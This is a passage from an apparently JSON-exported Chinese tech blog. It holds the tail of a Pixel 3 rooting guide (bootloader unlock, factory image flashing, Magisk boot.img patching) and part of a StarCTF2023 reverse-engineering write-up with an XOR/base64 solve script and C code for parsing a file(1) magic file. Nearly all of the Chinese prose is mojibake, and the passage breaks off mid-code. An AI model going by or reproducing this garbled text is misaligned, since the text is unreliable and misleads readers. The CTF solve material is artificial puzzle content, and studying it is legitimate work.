è®¾ç½®-&gt;ç³»ç»Ÿ-&gt;å¼€å‘è€…é€‰é¡¹ å¯ä»¥è¿›å…¥å¼€å‘è€…é€‰é¡¹ # è§£é” Bootloader âš ï¸ æ³¨æ„ï¼šè§£é”ä¼šæŠ¹é™¤æ‰€æœ‰æ•°æ®ï¼Œè¯·ä¸€å®šç¡®è®¤å¤‡ä»½å¥½é‡è¦æ•°æ®åå†è§£é” æ‰‹æœºï¼š å¼€å‘è€…é€‰é¡¹-&gt;OEM è§£é” - æ‰“å¼€ æ‰‹æœºï¼šè¿›å…¥ fastboot æ¨¡å¼ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ é‡å¯å¹¶é•¿æŒ‰ï¼ˆ ç”µæºé”® + éŸ³é‡å‡ ï¼‰ è¾“å…¥ adb reboot bootloader å‘½ä»¤ ç”µè„‘ï¼šUSB è¿æ¥æ‰‹æœº - æ‰§è¡Œ fastboot flashing unlock æˆ‘åœ¨ pixel6 è§£é” BL çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œ fastboot flashing unlock å‘½ä»¤ä¸€ç›´å¡åœ¨ &lt; waiting for any device &gt; , æ‰€ä»¥è¿™é‡Œè®°å½•ä¸€ä¸‹æˆ‘çš„è§£å†³æ–¹æ³• åŸå› ä¸€ https://www.youtube.com/watch?v=ajdcWIY-5yo è¿™å¯èƒ½æ˜¯ç”±äºæœªå®‰è£… Google USB Driver å¯¼è‡´çš„ï¼Œå‰å¾€å®˜ç½‘ä¸‹è½½å®‰è£…åŒ… å®˜ç½‘ä¹Ÿæœ‰å†™å¥½çš„å®‰è£…æ•™ç¨‹äº† æˆ‘çš„ç”µè„‘å³é”®-&gt;ç®¡ç† è¿›å…¥è®¾å¤‡ç®¡ç†å™¨ éšå å³é”®å…¶ä»–è®¾å¤‡,é€‰æ‹©æ‰‹æœºçš„è®¾å¤‡-&gt;æ›´æ–°é©±åŠ¨-&gt;æµè§ˆæˆ‘çš„ç”µè„‘ä»¥æŸ¥æ‰¾é©±åŠ¨ç¨‹åº ï¼Œé€‰æ‹© usb_driver_r13-windows.zip è§£å‹ä¹‹åçš„æ–‡ä»¶å¤¹è·¯å¾„ ä¸è¿‡è¿™ä¸ªæ–¹æ³•å¯¹æˆ‘æ— æ•ˆ åŸå› äºŒ è¯•äº†åŠå¤©ï¼Œå‘ç°æ˜¯ USB æ•°æ®çº¿çš„é—®é¢˜ï¼Œæˆ‘åœ¨è§£é” pixel6 çš„ BL æ—¶å‘ç° fastboot ä¼¼ä¹ä¸è¯†åˆ« type-c, éœ€è¦è®©æ‰‹æœºç”¨ USB è¿æ¥ç”µè„‘æ—¶ï¼Œæ‰‹æœºå¤„äºå……ç”µçš„çŠ¶æ€æ‰è¯æ˜è¿™æ ¹çº¿æ˜¯å¯ç”¨çš„ https://www.reddit.com/r/GooglePixel/comments/rc2lm7/pixel_6_not_detected_by_pc/ æ¢ä¸€æ ¹çº¿å°±å¥½äº† (å¹¸å¥½çº¿å¤šï½) æ‰‹æœºï¼šæŒ‰éŸ³é‡é”®ç›´åˆ°çœ‹è§ Unlock the bootloader - æŒ‰ç”µæºé”®ç¡®è®¤ # ä¸‹è½½æ‰‹æœºé•œåƒ pixel ç³»åˆ—æœ€å¥½çš„ä¸€ç‚¹å°±æ˜¯é•œåƒä¸ç”¨èŠ±é’±ä¹°ç›´æ¥å®˜ç½‘å°±èƒ½ä¸‹è½½äº†ï½ä¸‹è½½åœ°å€ ä¸‹è½½å®Œæˆåæ£€æŸ¥ä¸€æ³¢ sha256, å’Œä¸‹è¿‡æ¥çš„å¯¹çš„ä¸Šå°±æ²¡é—®é¢˜äº† PS D:\\TOOLS\\pixel3> certutil -hashfile .\\blueline-pq2a.190405.003-factory-c12f40f0.zip sha256SHA256 çš„ .\\blueline-pq2a.190405.003-factory-c12f40f0.zip å“ˆå¸Œ:c12f40f0b189eb2daa80d029917bc9a8841da89cfcafa21b8f61b0d9f90826e7CertUtil: -hashfile å‘½ä»¤æˆåŠŸå®Œæˆã€‚# åˆ·å…¥ google å®˜æ–¹é•œåƒ âš ï¸ å¦‚æœè¦åˆ·å…¥çš„é•œåƒç‰ˆæœ¬å·ä¸åŸæ‰‹æœºçš„ç‰ˆæœ¬å·ä¸ä¸€è‡´ï¼Œè¯·è¿›è¡Œè¯¥æ­¥æ“ä½œï¼Œå¦åˆ™è¯·å¿½ç•¥è¿™ä¸€æ­¥ï¼ï¼ adb reboot bootloader # å…ˆè¿›å…¥ bootloader æ¨¡å¼.\\flash-all.bat #Windows ç”¨æˆ·è¯·ä½¿ç”¨è¯¥å‘½ä»¤è¿›è¡Œåˆ·å…¥ï¼ŒMac ç”¨æˆ·è¯·ä½¿ç”¨./flash-all.sh è¿›è¡Œåˆ·å…¥éšåé™é™ç­‰å¾…é•œåƒåˆ·å…¥å®Œæˆå³å¯ï½ # ä½¿ç”¨ Magisk ä¿®è¡¥ boot.img å®ç° root å®‰è£… Magisk ä¸‹è½½åœ°å€ adb install \"D:\\TOOLS\\pixel3\\Magisk-v26.1.apk\"å°†é•œåƒè§£å‹åï¼ŒæŠŠ boot.img ä¼ åˆ°æ‰‹æœºä¸Š adb push boot.img /sdcard/ç„¶åå†æ‰‹æœºä¸Šæ‰“å¼€ Magisk , ä¾æ¬¡ç‚¹å‡» å®‰è£…-&gt;é€‰æ‹©å¹¶ä¿®è¡¥ä¸€ä¸ªæ–‡ä»¶-&gt;/sdcard/boot.img-&gt;å¼€å§‹ å¾…ä¿®è¡¥å®Œæˆåï¼Œå°†ä¿®è¡¥åçš„ boot.img ä¼ åˆ°ç”µè„‘ä¸Š adb pull /storage/emulated/0/Download/magisk_patched-xxxxx_xxxxx.imgç„¶ååˆ·å…¥ç»è¿‡ Magisk ä¿®è¡¥å¥½çš„ boot.img adb reboot bootloader # å…ˆè¿›å…¥ fastboot modefastboot flash boot magisk_patched-xxxxx_xxxxx.imgæµ‹è¯•ä¸€æ³¢ï¼Œå‡ºç° # å°±æ˜¯ root å®Œæˆå•¦ PS D:\\TOOLS\\pixel3> adb shellblueline:/ $ sublueline:/ #Pixel3, æœªæ¥è¿˜è¯·å¤šå¤šæŒ‡æ•™ (â—â€™â—¡â€™â—) # å‚è€ƒèµ„æ–™ Pixel3 åˆ·æœº Android9 å¹¶ Root ç©æœºçš„å¿…å¤‡æ“ä½œ â€”â€” Pixel3 å®‰è£… Magisk","categories":[],"tags":[{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"pixel3","slug":"pixel3","permalink":"https://oacia.dev/tags/pixel3/"}]},{"title":"StarCTF2023 é€†å‘writeup","slug":"starctf-writeup","date":"2023-07-31T11:13:07.000Z","updated":"2023-09-03T16:43:10.497Z","comments":true,"path":"starctf-writeup/","link":"","permalink":"https://oacia.dev/starctf-writeup/","excerpt":"","text":"å‰ä¸¤å¤©åˆšæ‰“å®Œçš„ starctf, å¯çœŸæ˜¯åç‰¢å‘€ï¼Œæ¯”èµ›æœŸé—´å‡ºäº†ä¸‰é¢˜ï¼Œèµ›åç»ˆäºåˆå¼„å‡ºæ¥äº†ä¸€é¢˜. GoGpt å°±æ˜¯å¸¸è§„çš„ go è¯­è¨€é€†å‘ï¼Œçœ‹é¢˜ç›®æè¿°ï¼Œé¢˜ç›®æ˜¯ chatGPT å‡ºçš„ï¼Œå“ˆå“ˆ AI ç«Ÿç„¶ä¹Ÿèƒ½å‡ºé¢˜äº†ï¼Œä¸è¿‡ç»ˆç©¶è¿˜æ˜¯ç®€å•é¢˜å‘€ï½ flagfile è¿™é¢˜æœ‰ç‚¹æ„æ€ï¼Œç”¨äº† linux ä¸­çš„ file -m å‘½ä»¤å¯ä»¥è‡ªå®šä¹‰ magic file çš„ç‰¹ç‚¹ï¼Œæ¥æ£€æµ‹ä¸€ä¸ªæ–‡ä»¶çš„æ¯ä¸€ä¸ªå­—èŠ‚æ˜¯å¦ç¬¦åˆé­”æ•°æ–‡ä»¶ä¸­çš„è§„åˆ™çš„åŒ¹é…ï¼Œæ¥åˆ¤æ–­æ˜¯å¦ä¸ºæ­£ç¡®çš„ flag, åšå®Œè¿™é¢˜ä¹‹åçŒ›ç„¶å‘ç°ï¼ŒåŸæ¥æœ‰è§„åˆ™çš„åœ°æ–¹å°±æœ‰é€†å‘ï¼ ez_code ç”¨åˆ°äº† powershell ç‰¹æ®Šç¬¦å·æ··æ·†ï¼Œå¤šäºçœ‹é›ªä¸Šçš„ä¸€ç¯‡æ–‡ç« ï¼Œçœ‹åˆ°ä¸‹é¢çš„ä¸€æ¡è¯„è®º å¤§å®¶å¥½å¥½å­¦ä¹ ä¸€ç•ªï¼Œè¯´ä¸å®šå“ªæ¬¡ctfå°±æ¥è¿™ç§ã€‚ ç®€ç›´èšŒåŸ ä½äº†ï¼Œè¿™ç§æ··æ·†ä¸€èˆ¬éƒ½æ˜¯ä¸ºäº†å…æ€ï¼Œä¸çŸ¥é“ä¸‹æ¬¡é‡åˆ°åˆ«çš„æ··æ·†è¿˜èƒ½ä¸èƒ½åšå‡ºæ¥ï¼Œä¸è¿‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—çš„ï½ boring cipher å¯çœŸæ˜¯åšçš„æŠ˜ç£¨ï¼Œrust é€†å‘è¿˜å¥½ï¼Œæ¯•ç«Ÿç»å†äº†è¿‡å»è®¸å¤š go é€†å‘çš„éäººçš„æŠ˜ç£¨ï¼Œçœ‹åˆ° rust å’Œ go ç›¸æ¯”ç®€ç›´å°±æ˜¯å°å·«è§å¤§å·«äº†ï¼Œäºæ˜¯å¾ˆå¿«å°±æŠŠæ­£å‘ä»£ç ç»™å†™å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯å»å†™é€†å‘è„šæœ¬ï¼Œä¸€å¼€å§‹æˆ‘å‘åŒºåŒºé€†å‘è„šæœ¬ï¼Œçœ‹æˆ‘ç›´æ¥ä»æ­£å‘ä»£ç ç»™é€†æ¨å‡ºæ¥ï¼ç„¶åå‘ç°â€¦ å¯æ¶ï¼Œæ ¹æœ¬å°±æ²¡æœ‰å¯é€†çš„ç‚¹ï¼åæ¥æƒ³èµ·æ¥ç¥å¥‡çš„ z3 , æˆ‘ç›´æ¥ z3 æŠŠè¿™é¢˜ä¸€æŠŠæ¢­äº†ï¼Œè™½è¯´æ¶è¡¥äº†è®¸å¤šè®¸å¤šçš„ z3 å°æŠ€å·§ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨â€¦ æˆ‘ä¸€åº¦ä»¥ä¸ºæ˜¯ z3 è„šæœ¬è¿è¡Œçš„æ—¶é—´ä¸å¤Ÿï¼Œæ‰€ä»¥ç­‰å‘€ç­‰å‘€ï¼ŒçŸ¥é“è¿™è„šæœ¬æŠŠæˆ‘ C ç›˜ç©ºé—´è€—å°½äº†è¿˜æ²¡æœ‰å‡ºï¼Œåæ¥æˆ‘è½¬æˆ˜è™šæ‹Ÿæœºï¼Œåœ¨è™šæ‹Ÿæœºé‡Œé¢è·‘è¿™ä¸ªä»£ç ï¼Œä¸€ç›´ç›¯ç€ç”µè„‘å±å¹•åˆ°å‡Œæ™¨å…­ç‚¹ï¼Œè¿˜æ˜¯å‡ºä¸äº† flag/(ã„’ o ã„’)/~ å´©æºƒå•Šã€‚åœ¨ starctf ç»“æŸåçš„é‚£ä¸€å¤©ï¼Œæˆ‘åˆçœ‹äº†ä¸€æ•´å¤©çš„ boring cipher , ç»ˆäºæˆ‘å‘ç°äº†æ­£å‘ä»£ç ä¸­é‚£ä¸ªè¶…å¤§çš„å¸¸æ•°æ•°ç»„ä¼¼ä¹å¦æœ‰ç„æœºï¼Œä¸€ç•ªåˆ†æä¹‹åï¼Œç»ˆäºå‡º flag äº† é¢˜ç›®é™„ä»¶: ç‚¹å‡»ä¸‹è½½ # GoGpt IDA æ‰“å¼€ï¼Œå‘ç°ä» 0x45FE80 å¼€å§‹çš„æ±‡ç¼–æ²¡æœ‰è¯†åˆ«å‡ºæ¥ é‚£å°±æŒ‰ä¸‹ Alt+L é€‰ä¸­æ²¡æœ‰è¯†åˆ«å‡ºæ¥çš„åœ°æ–¹ï¼Œç„¶åæŒ‰ä¸‹ C å¯¹ .text æ®µé‡æ–°è¯†åˆ« ç„¶åç”¨ IDAGolangHelper_SupportGo1.20 æ¢å¤ä¸€ä¸‹å‡½æ•°ç¬¦å· æ‰¾åˆ° main_main å‡½æ•°ï¼Œå‘ç°æ˜¯ç®€å•çš„å¼‚æˆ– + base64 åŠ¨è°ƒå‘ç°å¼‚æˆ–çš„å­—ç¬¦ä¸²æ˜¯æœ‰å˜åŒ–çš„ exp å¦‚ä¸‹ import base64str = b\"fiAGBkgXN3McFy9hAHRfCwYaIjQCRDFsXC8ZYBFmEDU=\"# xor_str = b\"cH@t_GpT_15_h3R3\"xor_str = b\"TcR@3t_3hp_5_G1H\"ss = base64.b64decode(str)# print(ss)for index,ch in enumerate(ss): print(chr(ch^xor_str[index%16]),end='') # *CTF&#123;ch@tgpT_3nCRypt10n_4_FUN!!&#125;# flagfile å…ˆçœ‹ä¸€ä¸‹çœ‹ä¸€çœ¼é™„ä»¶ä¸­çš„ readme.txt generate your own flag file, verify using `file` command like this:$ file -m flag.mgc flagflag: yes, it's a flag!$ file --versionfile-5.41magic file from /usr/share/file/magicé‚£çœ‹çœ‹ file -m æ˜¯å‘½ä»¤æ˜¯ä»€ä¹ˆæ„æ€ï¼ŒåŸæ¥å¯ä»¥è‡ªå·±å†™è§„åˆ™æ¥åŒ¹é…é‚£äº›æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹çš„ oacia@oacia-virtual-machine:~/Desktop/flagfile$ file --helpUsage: file [OPTION...] [FILE...]Determine type of FILEs. --help display this help and exit -v, --version output version information and exit -m, --magic-file LIST use LIST as a colon-separated list of magic number filesç„¶åå» github æŠŠ file5.4.1 çš„æºä»£ç ä¸‹è¿‡æ¥çœ‹çœ‹ å…³é”®éœ€è¦çœ‹æ‡‚ file.h é‡Œé¢å¯¹äºç»“æ„ä½“ magic çš„å®šä¹‰ union VALUETYPE &#123; uint8_t b; uint16_t h; uint32_t l; uint64_t q; uint8_t hs[2]; /* 2 bytes of a fixed-endian \"short\" */ uint8_t hl[4]; /* 4 bytes of a fixed-endian \"long\" */ uint8_t hq[8]; /* 8 bytes of a fixed-endian \"quad\" */ char s[MAXstring]; /* the search string or regex pattern */ unsigned char us[MAXstring]; uint64_t guid[2]; float f; double d;&#125;;struct magic &#123; /* Word 1 */ uint16_t cont_level; /* level of \">\" */ uint8_t flag;#define INDIR 0x01 /* if '(...)' appears */#define OFFADD 0x02 /* if '>&amp;' or '>...(&amp;' appears */#define INDIROFFADD 0x04 /* if '>&amp;(' appears */#define UNSIGNED 0x08 /* comparison is unsigned */#define NOSPACE 0x10 /* suppress space character before output */#define BINTEST 0x20 /* test is for a binary type (set only for top-level tests) */#define TEXTTEST 0x40 /* for passing to file_softmagic */#define OFFNEGATIVE 0x80 /* relative to the end of file */ uint8_t factor; /* Word 2 */ uint8_t reln; /* relation (0=eq, '>'=gt, etc) */ uint8_t vallen; /* length of string value, if any */ uint8_t type; /* comparison type (FILE_*) */ uint8_t in_type; /* type of indirection */#define FILE_INVALID 0#define FILE_BYTE 1#define FILE_SHORT 2#define FILE_DEFAULT 3#define FILE_LONG 4#define FILE_STRING 5#define FILE_DATE 6#define FILE_BESHORT 7#define FILE_BELONG 8#define FILE_BEDATE 9#define FILE_LESHORT 10#define FILE_LELONG 11#define FILE_LEDATE 12#define FILE_PSTRING 13#define FILE_LDATE 14#define FILE_BELDATE 15#define FILE_LELDATE 16#define FILE_REGEX 17#define FILE_BESTRING16 18#define FILE_LESTRING16 19#define FILE_SEARCH 20#define FILE_MEDATE 21#define FILE_MELDATE 22#define FILE_MELONG 23#define FILE_QUAD 24#define FILE_LEQUAD 25#define FILE_BEQUAD 26#define FILE_QDATE 27#define FILE_LEQDATE 28#define FILE_BEQDATE 29#define FILE_QLDATE 30#define FILE_LEQLDATE 31#define FILE_BEQLDATE 32#define FILE_FLOAT 33#define FILE_BEFLOAT 34#define FILE_LEFLOAT 35#define FILE_DOUBLE 36#define FILE_BEDOUBLE 37#define FILE_LEDOUBLE 38#define FILE_BEID3 39#define FILE_LEID3 40#define FILE_INDIRECT 41#define FILE_QWDATE 42#define FILE_LEQWDATE 43#define FILE_BEQWDATE 44#define FILE_NAME 45#define FILE_USE 46#define FILE_CLEAR 47#define FILE_DER 48#define FILE_GUID 49#define FILE_OFFSET 50#define FILE_BEVARINT 51#define FILE_LEVARINT 52#define FILE_NAMES_SIZE 53 /* size of array to contain all names */#define IS_STRING(t) \\ ((t) == FILE_STRING || \\ (t) == FILE_PSTRING || \\ (t) == FILE_BESTRING16 || \\ (t) == FILE_LESTRING16 || \\ (t) == FILE_REGEX || \\ (t) == FILE_SEARCH || \\ (t) == FILE_INDIRECT || \\ (t) == FILE_NAME || \\ (t) == FILE_USE)#define FILE_FMT_NONE 0#define FILE_FMT_NUM 1 /* \"cduxXi\" */#define FILE_FMT_STR 2 /* \"s\" */#define FILE_FMT_QUAD 3 /* \"ll\" */#define FILE_FMT_FLOAT 4 /* \"eEfFgG\" */#define FILE_FMT_DOUBLE 5 /* \"eEfFgG\" */ /* Word 3 */ uint8_t in_op; /* operator for indirection */ uint8_t mask_op; /* operator for mask */#ifdef ENABLE_CONDITIONALS uint8_t cond; /* conditional type */#else uint8_t dummy;#endif uint8_t factor_op;#define FILE_FACTOR_OP_PLUS '+'#define FILE_FACTOR_OP_MINUS '-'#define FILE_FACTOR_OP_TIMES '*'#define FILE_FACTOR_OP_DIV '/'#define FILE_FACTOR_OP_NONE '\\0'#define FILE_OPS \"&amp;|^+-*/%\"#define FILE_OPAND 0#define FILE_OPOR 1#define FILE_OPXOR 2#define FILE_OPADD 3#define FILE_OPMINUS 4#define FILE_OPMULTIPLY 5#define FILE_OPDIVIDE 6#define FILE_OPMODULO 7#define FILE_OPS_MASK 0x07 /* mask for above ops */#define FILE_UNUSED_1 0x08#define FILE_UNUSED_2 0x10#define FILE_OPSIGNED 0x20#define FILE_OPINVERSE 0x40#define FILE_OPINDIRECT 0x80#ifdef ENABLE_CONDITIONALS#define COND_NONE 0#define COND_IF 1#define COND_ELIF 2#define COND_ELSE 3#endif /* ENABLE_CONDITIONALS */ /* Word 4 */ int32_t offset; /* offset to magic number */ /* Word 5 */ int32_t in_offset; /* offset from indirection */ /* Word 6 */ uint32_t lineno; /* line number in magic file */ /* Word 7,8 */ union &#123; uint64_t _mask; /* for use with numeric and date types */ struct &#123; uint32_t _count; /* repeat/line count */ uint32_t _flags; /* modifier flags */ &#125; _s; /* for use with string types */ &#125; _u;#define num_mask _u._mask#define str_range _u._s._count#define str_flags _u._s._flags /* Words 9-24 */ union VALUETYPE value; /* either number or string */ /* Words 25-40 */ char desc[MAXDESC]; /* description */ /* Words 41-60 */ char mimetype[MAXMIME]; /* MIME type */ /* Words 61-62 */ char apple[8]; /* APPLE CREATOR/TYPE */ /* Words 63-78 */ char ext[64]; /* Popular extensions */&#125;;ç”¨ 010editor çœ‹ä¸€ä¸‹ flag.mgc , æˆ‘ä»¬éœ€è¦åšæ˜¯å°±æ˜¯å°† flag.mgc ä¸­çš„å­—èŠ‚å’Œç»“æ„ä½“ magic ä¸­çš„ç»“æ„ä½“æˆå‘˜ä¸€ä¸€å¯¹åº”èµ·æ¥ï¼Œç„¶ååˆ†ææ¯ä¸€ä¸ªå­—èŠ‚å¯¹åº”çš„å«ä¹‰ æˆ‘ä»¬è¦ä» 0x178 å¤„ä¸ºåç§»å»è¯»å–å¤§å°ä¸º sizeof(struct magic) çš„å†…å­˜ï¼Œå¦‚æœè¯´æ€ä¹ˆçŸ¥é“çš„è¯ï¼Œä½ çœ‹è¿™ä¸ªå­—ç¬¦ä¸² flag&#123; æ˜¯å¦ç‰¹åˆ«çªå‡ºï¼Œç„¶åä» 0x178 å¼€å§‹çš„ä¸€ä¸ª word æ‰ä¸å…¨ä¸º 0, èƒ½ä¸è®©äººéæƒ³è¿™åç§»ä¸æ˜¯ä»è¿™å„¿å¼€å§‹çš„å˜›ï½ int main()&#123; FILE *fp = fopen(\"./flag.mgc\",\"rb\"); struct magic buffer[100]; fseek(fp,0x178,SEEK_SET); fread(buffer,sizeof(struct magic),0x42,fp);&#125;äºæ˜¯ä¹ï¼Œ buffer å°±åŒ…å«äº†è¿™ä¸ª flag.mgc çš„æ‰€æœ‰çš„é‡è¦å†…å®¹ï¼Œæˆ‘ä»¬æ‰“å°ä¸€ä¸‹å†…å®¹çœ‹çœ‹ void print_buffer(struct magic buffer,int index)&#123; printf(\"buffer[%d]->cont_level = 0x%x\\n\",index,buffer.cont_level); printf(\"buffer[%d]->flag = 0x%x\\n\",index,buffer.flag); printf(\"buffer[%d]->factor = 0x%x\\n\",index,buffer.factor); printf(\"buffer[%d]->reln = 0x%x\\n\",index,buffer.reln); printf(\"buffer[%d]->vallen = 0x%x\\n\",index,buffer.vallen); printf(\"buffer[%d]->type = 0x%x\\n\",index,buffer.type); printf(\"buffer[%d]->in_type = 0x%x\\n\",index,buffer.in_type); printf(\"buffer[%d]->in_op = 0x%x\\n\",index,buffer.in_op); printf(\"buffer[%d]->mask_op = 0x%x\\n\",index,buffer.mask_op); printf(\"buffer[%d]->dummy = 0x%x\\n\",index,buffer.dummy); printf(\"buffer[%d]->factor_op = 0x%x\\n\",index,buffer.factor_op); printf(\"buffer[%d]->offset = 0x%x\\n\",index,buffer.offset); printf(\"buffer[%d]->in_offset = 0x%x\\n\",index,buffer.in_offset); printf(\"buffer[%d]->lineno = 0x%x\\n\",index,buffer.lineno); printf(\"buffer[%d]->num_mask = 0x%x\\n\",index,buffer.num_mask); printf(\"buffer[%d]->str_range = 0x%x\\n\",index,buffer.str_range); printf(\"buffer[%d]->str_flags = 0x%x\\n\",index,buffer.str_flags); if(buffer.type==5)&#123; printf(\"buffer[%d]->value = \\\"%s\\\"\\n\",index,buffer.value); &#125; else&#123; printf(\"buffer[%d]->value = 0x%x\\n\",index,buffer.value); &#125; printf(\"buffer[%d]->desc = \\\"%s\\\"\\n\",index,buffer.desc); printf(\"buffer[%d]->mimetype = \\\"%s\\\"\\n\",index,buffer.mimetype); printf(\"buffer[%d]->apple = \\\"%s\\\"\\n\",index,buffer.apple); printf(\"buffer[%d]->ext = \\\"%s\\\"\\n\\n\",index,buffer.ext);&#125;æŒ‘å‡ ä¸ªæœ‰ä»£è¡¨æ€§çš„åˆ†æä¸€ä¸‹ member è¯´æ˜ buffer[0] buffer[1] buffer[33] cont_level level of â€œ&gt;â€ 0x0 0x1 0x21 flag 0x0 è¡¨ç¤ºæ— ç‰¹æ®Šæƒ…å†µï¼Œ0x1 è¡¨ç¤ºâ€™(â€¦)' å‡ºç°åœ¨è§„åˆ™ä¸­ 0x20 0x0 0x1 factor 0x0 0x0 0x0 reln relation (0=eq, â€˜&gt;â€™=gt, etc), = = = vallen å¦‚æœç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œ vallen è¡¨ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦ 0x5 0x0 0x0 type comparison type (FILE_*),0x5 ä»£è¡¨ FILE_STRING (å­—ç¬¦ä¸²ç±»å‹),0xa ä»£è¡¨ FILE_LESHORT (short ç±»å‹ï¼Œå ç”¨ 2 å­—èŠ‚),0x1 ä»£è¡¨ FILE_BYTE (byte ç±»å‹ï¼Œå ç”¨ 1 å­—èŠ‚) 0x5 0xa 0x1 in_type type of indirection, å³é—´æ¥å¼•ç”¨çš„æ•°æ®çš„ç±»å‹ï¼Œ0x1 ä»£è¡¨é—´æ¥å¼•ç”¨çš„æ•°æ®ç±»å‹ä¸º FILE_BYTE (byte ç±»å‹ï¼Œå ç”¨ 1 å­—èŠ‚) 0x0 0x0 0x1 in_op operator for indirection 0x0 0x0 0x0 mask_op operator for mask, å¯¹ç…§ç»“æ„ä½“å®šä¹‰ï¼Œ0x2 è¡¨ç¤º FILE_OPXOR , å³å¼‚æˆ–æ“ä½œ 0x0 0x2 0x2 dummy 0x0 0x0 0x0 factor_op 0x0 0x0 0x0 offset ç›¸å¯¹äº magic number çš„åç§» 0x0 0x40 0x40 in_offset offset from indirection 0x0 0x0 0x0 lineno line number in magic file 0x1 0x2 0x22 num_mask å­˜å‚¨çš„å€¼ä¸ºç»è¿‡æ“ä½œç¬¦æ“ä½œä¹‹åçš„æ•°å€¼ï¼Œå¦‚æ­¤å¤„å¯¹äº buffer [1] ä¸­çš„æ•°è¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œé‚£ä¹ˆå¼‚æˆ–çš„æ•°å³ä¸º 0x76 0x0 0x76 0xffffff8a value å­˜å‚¨çš„æ˜¯æœ€ç»ˆè¦è¿›è¡Œæ•°å­—æˆ–å­—ç¬¦ä¸²æ¯”è¾ƒè¦ç”¨åˆ°çš„å€¼ï¼Œç”±äº value ä¸º union è”åˆä½“ç±»å‹ï¼Œæ‰€ä»¥è¾“å‡ºæ•°æ®æ—¶é¦–å…ˆè¦é€šè¿‡ type æ¥åˆ¤æ–­å­˜å‚¨çš„æ•°å€¼çš„ç±»å‹æ˜¯ä»€ä¹ˆï¼Œç„¶åå†è¿›è¡Œè¾“å‡º â€œflag{â€ 0x6f 0xec desc â€œâ€ â€œâ€ â€œâ€ mimetype â€œâ€ â€œâ€ â€œâ€ apple â€œâ€ â€œâ€ â€œâ€ ç”±æ­¤æˆ‘ä»¬ä¾¿çŸ¥é“äº† buffer[1]~buffer[32] çš„ä½œç”¨æ˜¯ä¸ºä¸ºä¸€å—å†…å­˜åœ°å€èµ‹å€¼ å¯¹äº buffer[1] , è¿™æ¡è§„åˆ™è§„å®šäº† memory[buffer[1].offset]^buffer[1].num_mask=buffer[1].value.h è€Œå¯¹äº buffer[33]~buffer[64] , ç”±äºé—´æ¥å¼•ç”¨ç±»å‹ buffer[33].in_type æ˜¯ 0x1 , æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ€è€ƒæ˜¯å“ªä¸ªåœ°æ–¹ä½¿ç”¨äº†é—´æ¥å¼•ç”¨ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å®ƒçš„ buffer[33].flag å€¼ä¸º 0x1 , è¯´æ˜äº†å­˜åœ¨ (...) , é‚£ä¹ˆæ‹¬å·å†…å³è¢«é—´æ¥è°ƒç”¨çš„æ•°æ®ï¼Œè¿˜è®°å¾—æˆ‘ä»¬æ›¾åœ¨ buffer[1]~buffer[32] ä¸ºä¸€å—å†…å­˜åœ°å€èµ‹è¿‡å€¼ï¼Œæ‰€ä»¥ç°åœ¨è¿™é‡Œå°±è¦æ”¶å›ä¸Šé¢åŸ‹ä¸‹çš„ä¼ç¬”ï¼Œé—´æ¥å¼•ç”¨çš„å°±æ˜¯é‚£å—å†…å­˜ä¸­çš„å€¼ï¼Œè€Œä¸”æˆ‘ä»¬æ³¨æ„åˆ° buffer[1].offset==buffer[33].offset==0x40 , å‡æƒ³å¦‚æœåç§»éƒ½ä¸ä¸€æ ·ï¼Œæ€ä¹ˆå¯èƒ½ä¼šå–åˆ°ç›¸å¯¹åº”çš„å€¼å‘¢ï¼Ÿè€Œå®ƒçš„ä½œç”¨å°±æ˜¯å’Œæœ€ç»ˆçš„ flag çš„æ¯ä¸€ä½è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥è§„åˆ™æ˜¯è¿™æ ·çš„: buffer[33].value.b^buffer[33].num_mask==flag[memory[buffer[33].offset]] , ä»¥æ­¤æ¥åˆ¤æ–­ flag æ˜¯å¦æ­£ç¡® åˆ†æå®Œæ¯•ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡º exp æ¥äº† #include&lt;stdio.h>#ifndef __int8_t_defined # define __int8_t_defined typedef signed char int8_t; typedef short int int16_t; typedef int int32_t; # if __WORDSIZE == 64 typedef long int int64_t; # else __extension__ typedef long long int int64_t; # endif #endif typedef unsigned char uint8_t; typedef unsigned short int uint16_t; #ifndef __uint32_t_defined typedef unsigned int uint32_t; # define __uint32_t_defined #endif #if __WORDSIZE == 64 typedef unsigned long int uint64_t; #else __extension__ typedef unsigned long long int uint64_t; #endif#define MAXDESC 64 /* max len of text description/MIME type */#define MAXMIME 80 /* max len of text MIME type */#define MAXstring 128 /* max len of \"string\" types */#define MAGIC_SETS 2union VALUETYPE &#123; uint8_t b; uint16_t h; uint32_t l; uint64_t q; uint8_t hs[2]; /* 2 bytes of a fixed-endian \"short\" */ uint8_t hl[4]; /* 4 bytes of a fixed-endian \"long\" */ uint8_t hq[8]; /* 8 bytes of a fixed-endian \"quad\" */ char s[MAXstring]; /* the search string or regex pattern */ unsigned char us[MAXstring]; uint64_t guid[2]; float f; double d;&#125;;struct magic &#123; /* Word 1 */ uint16_t cont_level; /* level of \">\" */ uint8_t flag;#define INDIR 0x01 /* if '(...)' appears */#define OFFADD 0x02 /* if '>&amp;' or '>...(&amp;' appears */#define INDIROFFADD 0x04 /* if '>&amp;(' appears */#define UNSIGNED 0x08 /* comparison is unsigned */#define NOSPACE 0x10 /* suppress space character before output */#define BINTEST 0x20 /* test is for a binary type (set only for top-level tests) */#define TEXTTEST 0x40 /* for passing to file_softmagic */#define OFFNEGATIVE 0x80 /* relative to the end of file */ uint8_t factor; /* Word 2 */ uint8_t reln; /* relation (0=eq, '>'=gt, etc) */ uint8_t vallen; /* length of string value, if any */ uint8_t type; /* comparison type (FILE_*) */ uint8_t in_type; /* type of indirection */#define FILE_INVALID 0#define FILE_BYTE 1#define FILE_SHORT 2#define 